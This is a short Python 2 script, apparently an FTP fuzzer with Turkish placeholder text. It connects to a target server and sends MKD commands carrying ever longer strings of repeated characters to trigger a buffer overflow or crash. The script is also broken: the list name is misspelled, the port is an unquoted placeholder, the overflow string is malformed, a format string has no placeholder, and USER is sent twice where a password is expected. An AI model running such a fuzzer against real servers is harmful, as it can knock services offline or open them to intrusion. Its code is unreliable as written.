#!/usr/bin/env python

import socket
fuzeer = ['x\41']

counter = 0

def baglanti():

    global s
    s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("buraya baglanmak istediginiz adresigirn",buraya portu))

while len(fuzzer) <= 12:
    counter = counter + 100
    fuzzer.append(counter * 'x\41')

for boom in fuzzer:

    baglanti()
    s.recv(1024)
    s.send('USER ' + 'anonymous\r\n')
    s.recv(1024)
    s.send('USER ' + 'anonymous\r\n')
    s.recv(1024)
    print "deneme \n"%len(boom)
    print "--------------------"
    s.send('MKD '+ boom + '\r\n')
    s.close()

